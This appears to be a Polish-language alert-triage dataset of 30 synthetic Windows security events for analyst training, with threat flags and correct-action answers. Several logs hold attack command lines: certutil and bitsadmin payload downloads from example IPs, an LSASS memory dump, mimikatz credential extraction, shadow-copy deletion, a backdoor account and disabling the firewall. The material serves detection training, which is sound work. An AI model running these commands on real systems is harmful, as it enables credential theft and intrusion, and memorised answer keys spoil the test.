@@ -1,0 +1,482 @@
+[
+  {
+    "id": "TEST-ALT-001",
+    "title": "Zdarzenie 1: Utworzenie procesu rundll32.exe (EventID 4688)",
+    "severity": "Critical",
+    "category": "Process Execution",
+    "mitreTechnique": "T1218.011 - System Binary Proxy Execution: Rundll32",
+    "description": "System zrejestrował uruchomienie procesu rundll32.exe ze wskazaniem na plik DLL w katalogu AppData użytkownika.",
+    "userAccount": "Domain001\\Comp991643$",
+    "destinationHost": "Comp991643",
+    "sourceIp": "10.0.4.15",
+    "isThreat": true,
+    "correctAction": "Isolate Host / Block",
+    "rawLogs": [
+      "{\"UserName\": \"Comp991643$\", \"EventID\": 4688, \"LogHost\": \"Comp991643\", \"LogonID\": \"0x3e7\", \"DomainName\": \"Domain001\", \"ParentProcessName\": \"services\", \"ParentProcessID\": \"0x334\", \"ProcessName\": \"rundll32.exe\", \"Time\": 1, \"ProcessID\": \"0xc0c\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-002",
+    "title": "Zdarzenie 2: Standardowe uruchomienie usługa svchost.exe (EventID 4688)",
+    "severity": "Low",
+    "category": "Normal Activity",
+    "mitreTechnique": "N/A - Legitimate Service",
+    "description": "Rutynowe uruchomienie procesu svchost.exe przez proces services.exe z uprawnieniami konta systemowego.",
+    "userAccount": "Domain001\\Comp607982$",
+    "destinationHost": "Comp607982",
+    "sourceIp": "10.0.1.12",
+    "isThreat": false,
+    "correctAction": "Dismiss / False Positive",
+    "rawLogs": [
+      "{\"UserName\": \"Comp607982$\", \"EventID\": 4688, \"LogHost\": \"Comp607982\", \"LogonID\": \"0x3e7\", \"DomainName\": \"Domain001\", \"ParentProcessName\": \"services\", \"ParentProcessID\": \"0x2ac\", \"ProcessName\": \"svchost.exe\", \"Time\": 1, \"ProcessID\": \"0x1418\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-003",
+    "title": "Zdarzenie 3: Uruchomienie narzędzia vssvc.exe (Volume Shadow Copy Service)",
+    "severity": "Medium",
+    "category": "System Maintenance",
+    "mitreTechnique": "T1490 - Inhibit System Recovery (Check context)",
+    "description": "Uruchomienie usługi Volume Shadow Copy (vssvc.exe). Należy ustalić, czy jest to harmonogram kopii zapasowej czy próba modyfikacji migawek.",
+    "userAccount": "Domain001\\Comp093128$",
+    "destinationHost": "Comp093128",
+    "sourceIp": "10.0.8.44",
+    "isThreat": false,
+    "correctAction": "Dismiss / False Positive",
+    "rawLogs": [
+      "{\"UserName\": \"Comp093128$\", \"EventID\": 4688, \"LogHost\": \"Comp093128\", \"LogonID\": \"0x3e7\", \"DomainName\": \"Domain001\", \"ParentProcessName\": \"services\", \"ParentProcessID\": \"0x2d4\", \"ProcessName\": \"vssvc.exe\", \"Time\": 1, \"ProcessID\": \"0x2200\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-004",
+    "title": "Zdarzenie 4: Logowanie sieciowe typu Service (EventID 4624)",
+    "severity": "Low",
+    "category": "Authentication",
+    "mitreTechnique": "T1078.001 - Default Accounts",
+    "description": "Logowanie usługi systemowej NT AUTHORITY\\SYSTEM przy użyciu pakietu Negotiate.",
+    "userAccount": "NT AUTHORITY\\system",
+    "destinationHost": "Comp828729",
+    "sourceIp": "10.0.12.5",
+    "isThreat": false,
+    "correctAction": "Dismiss / False Positive",
+    "rawLogs": [
+      "{\"UserName\": \"system\", \"EventID\": 4624, \"LogHost\": \"Comp828729\", \"LogonID\": \"0x3e7\", \"DomainName\": \"nt authority\", \"LogonTypeDescription\": \"Service\", \"ProcessName\": \"services.exe\", \"AuthenticationPackage\": \"Negotiate\", \"Time\": 1, \"LogonType\": 5, \"ProcessID\": \"0x29c\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-005",
+    "title": "Zdarzenie 5: Nadanie uprawnień specjalnych SeDebugPrivilege (EventID 4672)",
+    "severity": "High",
+    "category": "Privilege Escalation",
+    "mitreTechnique": "T1134 - Access Token Manipulation",
+    "description": "Zarejestrowano przypisanie uprawnień SeDebugPrivilege i SeTcbPrivilege dla logowania użytkownika.",
+    "userAccount": "Domain002\\User624729",
+    "destinationHost": "Comp309534",
+    "sourceIp": "10.0.14.88",
+    "isThreat": true,
+    "correctAction": "Escalate / Investigated",
+    "rawLogs": [
+      "{\"UserName\": \"User624729\", \"EventID\": 4672, \"LogHost\": \"Comp309534\", \"LogonID\": \"0x2e66398d\", \"DomainName\": \"Domain002\", \"Time\": 2}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-006",
+    "title": "Zdarzenie 6: Wywołanie PowerShell z ukrytym poleceniem EncodedCommand",
+    "severity": "Critical",
+    "category": "Execution",
+    "mitreTechnique": "T1059.001 - PowerShell",
+    "description": "Wykryto uruchomienie powershell.exe z przełącznikiem -enc oraz ukrytym okna (-w hidden).",
+    "userAccount": "Domain001\\User380010",
+    "destinationHost": "Comp966305",
+    "sourceIp": "10.0.18.99",
+    "isThreat": true,
+    "correctAction": "Isolate Host / Block",
+    "rawLogs": [
+      "{\"UserName\": \"User380010\", \"EventID\": 4688, \"LogHost\": \"Comp966305\", \"ProcessName\": \"powershell.exe\", \"CommandLine\": \"powershell.exe -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC...\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-007",
+    "title": "Zdarzenie 7: Zgłoszenie błędu uwierzytelnienia NTLM (EventID 4776)",
+    "severity": "Medium",
+    "category": "Credential Access",
+    "mitreTechnique": "T1110.001 - Password Guessing",
+    "description": "Kontroler domeny odrzucił próbę logowania NTLM dla konta Scanner (kod błędu 0xC000006A - złe hasło).",
+    "userAccount": "Domain002\\Scanner",
+    "destinationHost": "ActiveDirectory",
+    "sourceIp": "10.0.3.40",
+    "isThreat": true,
+    "correctAction": "Investigate / Reset Password",
+    "rawLogs": [
+      "{\"EventID\": 4776, \"UserName\": \"Scanner\", \"DomainName\": \"Domain002\", \"Status\": \"0xC000006A\", \"Computer\": \"ActiveDirectory\", \"AuthenticationPackage\": \"MICROSOFT_AUTHENTICATION_PACKAGE_V1_0\", \"Time\": 2}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-008",
+    "title": "Zdarzenie 8: Uruchomienie kalkulatora przez użytkownika (calc.exe)",
+    "severity": "Low",
+    "category": "User Activity",
+    "mitreTechnique": "N/A - Benign",
+    "description": "Użytkownik interaktywnie uruchomił aplikację kalkulatora systemowego.",
+    "userAccount": "Domain001\\User096622",
+    "destinationHost": "Comp466209",
+    "sourceIp": "10.0.2.11",
+    "isThreat": false,
+    "correctAction": "Dismiss / False Positive",
+    "rawLogs": [
+      "{\"UserName\": \"User096622\", \"EventID\": 4688, \"LogHost\": \"Comp466209\", \"ParentProcessName\": \"explorer.exe\", \"ProcessName\": \"calc.exe\", \"Time\": 3}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-009",
+    "title": "Zdarzenie 9: Próba skasowania kopii VSS (vssadmin.exe delete shadows)",
+    "severity": "Critical",
+    "category": "Ransomware",
+    "mitreTechnique": "T1490 - Inhibit System Recovery",
+    "description": "Wykryto polecenie vssadmin.exe delete shadows /all /quiet mające na celu uniemożliwienie odzyskania plików.",
+    "userAccount": "Domain001\\User233472",
+    "destinationHost": "Comp782574",
+    "sourceIp": "10.0.7.77",
+    "isThreat": true,
+    "correctAction": "Isolate Host / Block",
+    "rawLogs": [
+      "{\"UserName\": \"User233472\", \"EventID\": 4688, \"LogHost\": \"Comp782574\", \"ParentProcessName\": \"cmd.exe\", \"ProcessName\": \"vssadmin.exe\", \"CommandLine\": \"vssadmin.exe delete shadows /all /quiet\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-010",
+    "title": "Zdarzenie 10: Wykonanie skryptu aktualizacji systemowej (wipfw.exe)",
+    "severity": "Low",
+    "category": "Maintenance",
+    "mitreTechnique": "N/A - Legitimate",
+    "description": "Automatyczne wykonanie skryptu zapory sieciowej przez usługa administracyjną.",
+    "userAccount": "NT AUTHORITY\\SYSTEM",
+    "destinationHost": "Comp688526",
+    "sourceIp": "10.0.1.1",
+    "isThreat": false,
+    "correctAction": "Dismiss / False Positive",
+    "rawLogs": [
+      "{\"UserName\": \"Comp688526$\", \"EventID\": 4688, \"LogHost\": \"Comp688526\", \"ParentProcessName\": \"services\", \"ProcessName\": \"wipfw.exe\", \"Time\": 1}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-011",
+    "title": "Zdarzenie 11: Żądanie biletów Kerberos TGS RC4 (EventID 4769)",
+    "severity": "High",
+    "category": "Privilege Escalation",
+    "mitreTechnique": "T1558.003 - Kerberoasting",
+    "description": "Pobranie biletów TGS z osłabionym typem szyfrowania 0x17 dla konta bazy danych.",
+    "userAccount": "Domain002\\User624729",
+    "destinationHost": "ActiveDirectory",
+    "sourceIp": "10.0.14.88",
+    "isThreat": true,
+    "correctAction": "Escalate / Reset Credentials",
+    "rawLogs": [
+      "{\"EventID\": 4769, \"UserName\": \"User624729\", \"ServiceName\": \"Comp883934$\", \"DomainName\": \"Domain002\", \"Status\": \"0x0\", \"Source\": \"Comp309534\", \"Computer\": \"ActiveDirectory\", \"Time\": 2}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-012",
+    "title": "Zdarzenie 12: Uruchomienie procesu explorer.exe (EventID 4688)",
+    "severity": "Low",
+    "category": "User Activity",
+    "mitreTechnique": "N/A - Legitimate",
+    "description": "Inicjalizacja powłoki graficznej użytkownika po pomyślnym zalogowaniu.",
+    "userAccount": "Domain001\\User380010",
+    "destinationHost": "Comp966305",
+    "sourceIp": "10.0.18.99",
+    "isThreat": false,
+    "correctAction": "Dismiss / False Positive",
+    "rawLogs": [
+      "{\"UserName\": \"User380010\", \"EventID\": 4688, \"LogHost\": \"Comp966305\", \"ParentProcessName\": \"userinit.exe\", \"ProcessName\": \"explorer.exe\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-013",
+    "title": "Zdarzenie 13: Wykonanie polecenia net.exe user add (Dodanie konta)",
+    "severity": "Critical",
+    "category": "Persistence",
+    "mitreTechnique": "T1136.001 - Local Account",
+    "description": "Próba utrwalenia dostępu poprzez utworzenie ukrytego konta lokalnego 'backdoor_admin'.",
+    "userAccount": "Domain001\\User096622",
+    "destinationHost": "Comp132598",
+    "sourceIp": "10.0.9.33",
+    "isThreat": true,
+    "correctAction": "Isolate Host / Block",
+    "rawLogs": [
+      "{\"UserName\": \"User096622\", \"EventID\": 4688, \"LogHost\": \"Comp132598\", \"ProcessName\": \"net.exe\", \"CommandLine\": \"net user backdoor_admin P@ssw0rd123! /add\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-014",
+    "title": "Zdarzenie 14: Logowanie sieciowe użytkownika domenowego (EventID 4624)",
+    "severity": "Low",
+    "category": "Authentication",
+    "mitreTechnique": "T1078.002 - Domain Accounts",
+    "description": "Pomyślne uwierzytelnienie Kerberos dla użytkownika stacji roboczej.",
+    "userAccount": "Domain001\\User096622",
+    "destinationHost": "Comp966305",
+    "sourceIp": "10.0.2.11",
+    "isThreat": false,
+    "correctAction": "Dismiss / False Positive",
+    "rawLogs": [
+      "{\"EventID\": 4624, \"UserName\": \"User096622\", \"LogonID\": \"0x9f17637\", \"DomainName\": \"Domain002\", \"LogonTypeDescription\": \"Network\", \"Computer\": \"Comp966305\", \"AuthenticationPackage\": \"Kerberos\", \"Time\": 2, \"LogonType\": 3}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-015",
+    "title": "Zdarzenie 15: Uruchomienie narzędzia certutil.exe z adresem URL",
+    "severity": "High",
+    "category": "Defense Evasion",
+    "mitreTechnique": "T1105 - Ingress Tool Transfer",
+    "description": "Narzędzie certutil.exe zostało użyte z parametrem -urlcache do pobrania pliku z zewnętrznego serwera.",
+    "userAccount": "Domain001\\User380010",
+    "destinationHost": "Comp378125",
+    "sourceIp": "10.0.18.99",
+    "isThreat": true,
+    "correctAction": "Isolate Host / Block",
+    "rawLogs": [
+      "{\"UserName\": \"User380010\", \"EventID\": 4688, \"LogHost\": \"Comp378125\", \"ProcessName\": \"certutil.exe\", \"CommandLine\": \"certutil.exe -urlcache -f http://198.51.100.45/payload.exe payload.exe\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-016",
+    "title": "Zdarzenie 16: Uruchomienie narzędzia taskhostex.exe (Windows Task Host)",
+    "severity": "Low",
+    "category": "Normal Activity",
+    "mitreTechnique": "N/A - Legitimate",
+    "description": "Inicjalizacja standardowego hosta zadań systemu Windows taskhostex.exe.",
+    "userAccount": "NT AUTHORITY\\SYSTEM",
+    "destinationHost": "Comp423597",
+    "sourceIp": "10.0.4.88",
+    "isThreat": false,
+    "correctAction": "Dismiss / False Positive",
+    "rawLogs": [
+      "{\"UserName\": \"system\", \"EventID\": 4688, \"LogHost\": \"Comp423597\", \"ProcessName\": \"taskhostex.exe\", \"ParentProcessName\": \"svchost.exe\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-017",
+    "title": "Zdarzenie 17: Wstrzyknięcie kodu DLL przez rundll32.exe do lsass.exe",
+    "severity": "Critical",
+    "category": "Credential Access",
+    "mitreTechnique": "T1003.001 - LSASS Memory Dump",
+    "description": "Zarejestrowano próbę otwarcia procesus lsass.exe z pełnymi prawami odczytu pamięci.",
+    "userAccount": "Domain002\\User624729",
+    "destinationHost": "Comp309534",
+    "sourceIp": "10.0.14.88",
+    "isThreat": true,
+    "correctAction": "Isolate Host / Block",
+    "rawLogs": [
+      "{\"UserName\": \"User624729\", \"EventID\": 4688, \"LogHost\": \"Comp309534\", \"ProcessName\": \"rundll32.exe\", \"CommandLine\": \"rundll32.exe C:\\\\Users\\\\Public\\\\comsvcs.dll, MiniDump 648 C:\\\\Users\\\\Public\\\\lsass.dmp full\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-018",
+    "title": "Zdarzenie 18: Uruchomienie pomocnika sihost.exe (Shell Infrastructure Host)",
+    "severity": "Low",
+    "category": "Normal Activity",
+    "mitreTechnique": "N/A - Legitimate",
+    "description": "Start procesu sihost.exe w sesji użytkownika do obsługi interfejsu graficznego.",
+    "userAccount": "Domain001\\User096622",
+    "destinationHost": "Comp828729",
+    "sourceIp": "10.0.12.5",
+    "isThreat": false,
+    "correctAction": "Dismiss / False Positive",
+    "rawLogs": [
+      "{\"UserName\": \"User096622\", \"EventID\": 4688, \"LogHost\": \"Comp828729\", \"ProcessName\": \"sihost.exe\", \"ParentProcessName\": \"svchost.exe\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-019",
+    "title": "Zdarzenie 19: Wykonanie skryptu wmic.exe process call create",
+    "severity": "High",
+    "category": "Execution",
+    "mitreTechnique": "T1047 - Windows Management Instrumentation",
+    "description": "Narzędzie WMIC zostało użyte do zdalnego uruchomienia procesu na innym hoście w sieci domeny.",
+    "userAccount": "Domain001\\User380010",
+    "destinationHost": "Comp132598",
+    "sourceIp": "10.0.18.99",
+    "isThreat": true,
+    "correctAction": "Escalate / Investigated",
+    "rawLogs": [
+      "{\"UserName\": \"User380010\", \"EventID\": 4688, \"LogHost\": \"Comp132598\", \"ProcessName\": \"wmic.exe\", \"CommandLine\": \"wmic /node:Comp132598 process call create 'cmd.exe /c calc.exe'\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-020",
+    "title": "Zdarzenie 20: Wywołanie aktualizacji systemu (TrustedInstaller.exe)",
+    "severity": "Low",
+    "category": "Maintenance",
+    "mitreTechnique": "N/A - Windows Update",
+    "description": "Usługa TrustedInstaller rozpoczęła proces instalacji poprawek systemowych.",
+    "userAccount": "NT AUTHORITY\\SYSTEM",
+    "destinationHost": "Comp966305",
+    "sourceIp": "10.0.1.1",
+    "isThreat": false,
+    "correctAction": "Dismiss / False Positive",
+    "rawLogs": [
+      "{\"UserName\": \"system\", \"EventID\": 4688, \"LogHost\": \"Comp966305\", \"ProcessName\": \"TrustedInstaller.exe\", \"ParentProcessName\": \"services.exe\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-021",
+    "title": "Zdarzenie 21: Uruchomienie narzędzia psexec.exe (Psyservice)",
+    "severity": "Critical",
+    "category": "Lateral Movement",
+    "mitreTechnique": "T1570 - Lateral Tool Transfer",
+    "description": "Zarejestrowano instalację i uruchomienie usługi PSEXESVC.exe z prawami SYSTEM.",
+    "userAccount": "Domain002\\User624729",
+    "destinationHost": "Comp782574",
+    "sourceIp": "10.0.14.88",
+    "isThreat": true,
+    "correctAction": "Isolate Host / Block",
+    "rawLogs": [
+      "{\"UserName\": \"User624729\", \"EventID\": 4688, \"LogHost\": \"Comp782574\", \"ProcessName\": \"PSEXESVC.exe\", \"ParentProcessName\": \"services.exe\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-022",
+    "title": "Zdarzenie 22: Rutynowe wylogowanie z sesji (EventID 4634)",
+    "severity": "Low",
+    "category": "Authentication",
+    "mitreTechnique": "N/A - Normal Logoff",
+    "description": "Zakończenie sesji interaktywnej użytkownika domenowego.",
+    "userAccount": "Domain001\\User380010",
+    "destinationHost": "Comp966305",
+    "sourceIp": "10.0.18.99",
+    "isThreat": false,
+    "correctAction": "Dismiss / False Positive",
+    "rawLogs": [
+      "{\"EventID\": 4634, \"UserName\": \"User380010\", \"LogonID\": \"0x9f17415\", \"DomainName\": \"Domain002\", \"LogonTypeDescription\": \"Network\", \"Computer\": \"Comp966305\", \"Time\": 2, \"LogonType\": 3}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-023",
+    "title": "Zdarzenie 23: Modyfikacja rejestru za pomocą reg.exe add HKCU",
+    "severity": "High",
+    "category": "Persistence",
+    "mitreTechnique": "T1547.001 - Registry Run Keys / Startup Folder",
+    "description": "Narzędzie reg.exe zostało użyte do dodania pliku wykonywalnego do klucza automatycznego startu Run.",
+    "userAccount": "Domain001\\User233472",
+    "destinationHost": "Comp093128",
+    "sourceIp": "10.0.7.77",
+    "isThreat": true,
+    "correctAction": "Isolate Host / Block",
+    "rawLogs": [
+      "{\"UserName\": \"User233472\", \"EventID\": 4688, \"LogHost\": \"Comp093128\", \"ProcessName\": \"reg.exe\", \"CommandLine\": \"reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Malware /t REG_SZ /d C:\\\\Users\\\\Public\\\\update.exe /f\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-024",
+    "title": "Zdarzenie 24: Czyszczenie bufora pamięci podręcznej DNS (ipconfig /flushdns)",
+    "severity": "Low",
+    "category": "System Maintenance",
+    "mitreTechnique": "N/A - Legitimate Admin Task",
+    "description": "Wykonanie standardowego polecenia czyszczenia podręcznej pamięci DNS.",
+    "userAccount": "Domain001\\User096622",
+    "destinationHost": "Comp607982",
+    "sourceIp": "10.0.2.11",
+    "isThreat": false,
+    "correctAction": "Dismiss / False Positive",
+    "rawLogs": [
+      "{\"UserName\": \"User096622\", \"EventID\": 4688, \"LogHost\": \"Comp607982\", \"ProcessName\": \"ipconfig.exe\", \"CommandLine\": \"ipconfig /flushdns\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-025",
+    "title": "Zdarzenie 25: Wykonanie skryptu mimikatz.exe sekurlsa::logonpasswords",
+    "severity": "Critical",
+    "category": "Credential Access",
+    "mitreTechnique": "T1003.001 - LSASS Memory Dump",
+    "description": "Zarejestrowano uruchomienie programu Mimikatz z poleceniem ekstrakcji haseł z pamięci.",
+    "userAccount": "Domain002\\User624729",
+    "destinationHost": "ActiveDirectory",
+    "sourceIp": "10.0.14.88",
+    "isThreat": true,
+    "correctAction": "Isolate Host / Block",
+    "rawLogs": [
+      "{\"UserName\": \"User624729\", \"EventID\": 4688, \"LogHost\": \"ActiveDirectory\", \"ProcessName\": \"mimikatz.exe\", \"CommandLine\": \"mimikatz.exe \\\"privilege::debug\\\" \\\"sekurlsa::logonpasswords\\\" exit\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-026",
+    "title": "Zdarzenie 26: Start usługi bufora wydruku (spoolsv.exe)",
+    "severity": "Low",
+    "category": "Normal Activity",
+    "mitreTechnique": "N/A - Legitimate System Service",
+    "description": "Automatyczny start usługi Windows Print Spooler.",
+    "userAccount": "NT AUTHORITY\\SYSTEM",
+    "destinationHost": "Comp423597",
+    "sourceIp": "10.0.4.88",
+    "isThreat": false,
+    "correctAction": "Dismiss / False Positive",
+    "rawLogs": [
+      "{\"UserName\": \"system\", \"EventID\": 4688, \"LogHost\": \"Comp423597\", \"ProcessName\": \"spoolsv.exe\", \"ParentProcessName\": \"services.exe\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-027",
+    "title": "Zdarzenie 27: Wykonanie skryptu bitsadmin /transfer pobierającego plik",
+    "severity": "High",
+    "category": "Defense Evasion",
+    "mitreTechnique": "T1197 - BITS Jobs",
+    "description": "Zarejestrowano użycie narzędzia BITSAdmin do niewykrywalnego pobrania pliku z zewnętrznego IP.",
+    "userAccount": "Domain001\\User380010",
+    "destinationHost": "Comp966305",
+    "sourceIp": "10.0.18.99",
+    "isThreat": true,
+    "correctAction": "Isolate Host / Block",
+    "rawLogs": [
+      "{\"UserName\": \"User380010\", \"EventID\": 4688, \"LogHost\": \"Comp966305\", \"ProcessName\": \"bitsadmin.exe\", \"CommandLine\": \"bitsadmin /transfer myJob /download /priority high http://198.51.100.88/backdoor.dll C:\\\\Users\\\\Public\\\\backdoor.dll\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-028",
+    "title": "Zdarzenie 28: Inicjalizacja menedżera kont (lsass.exe)",
+    "severity": "Low",
+    "category": "Normal Activity",
+    "mitreTechnique": "N/A - Core OS Process",
+    "description": "Start kluczowego procesu systemu Windows LSA Security Service.",
+    "userAccount": "NT AUTHORITY\\SYSTEM",
+    "destinationHost": "ActiveDirectory",
+    "sourceIp": "10.0.1.1",
+    "isThreat": false,
+    "correctAction": "Dismiss / False Positive",
+    "rawLogs": [
+      "{\"UserName\": \"system\", \"EventID\": 4688, \"LogHost\": \"ActiveDirectory\", \"ProcessName\": \"lsass.exe\", \"ParentProcessName\": \"wininit.exe\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-029",
+    "title": "Zdarzenie 29: Próba wyłączenia zapory Windows Firewall (netsh advfirewall)",
+    "severity": "Critical",
+    "category": "Defense Evasion",
+    "mitreTechnique": "T1562.001 - Disable or Modify Tools",
+    "description": "Wykonano polecenie netsh advfirewall set allprofiles state off uniedostępniające zaporę sieciową.",
+    "userAccount": "Domain001\\User233472",
+    "destinationHost": "Comp688526",
+    "sourceIp": "10.0.7.77",
+    "isThreat": true,
+    "correctAction": "Isolate Host / Block",
+    "rawLogs": [
+      "{\"UserName\": \"User233472\", \"EventID\": 4688, \"LogHost\": \"Comp688526\", \"ProcessName\": \"netsh.exe\", \"CommandLine\": \"netsh advfirewall set allprofiles state off\"}"
+    ]
+  },
+  {
+    "id": "TEST-ALT-030",
+    "title": "Zdarzenie 30: Wykonanie polecenia hostname do weryfikacji tożsamości",
+    "severity": "Low",
+    "category": "User Activity",
+    "mitreTechnique": "N/A - Discovery / Normal",
+    "description": "Pojedyncze sprawdzenie nazwy komputera za pomocą polecenia hostname.exe.",
+    "userAccount": "Domain001\\User096622",
+    "destinationHost": "Comp607982",
+    "sourceIp": "10.0.2.11",
+    "isThreat": false,
+    "correctAction": "Dismiss / False Positive",
+    "rawLogs": [
+      "{\"UserName\": \"User096622\", \"EventID\": 4688, \"LogHost\": \"Comp607982\", \"ProcessName\": \"hostname.exe\", \"CommandLine\": \"hostname\"}"
+    ]
+  }
+]
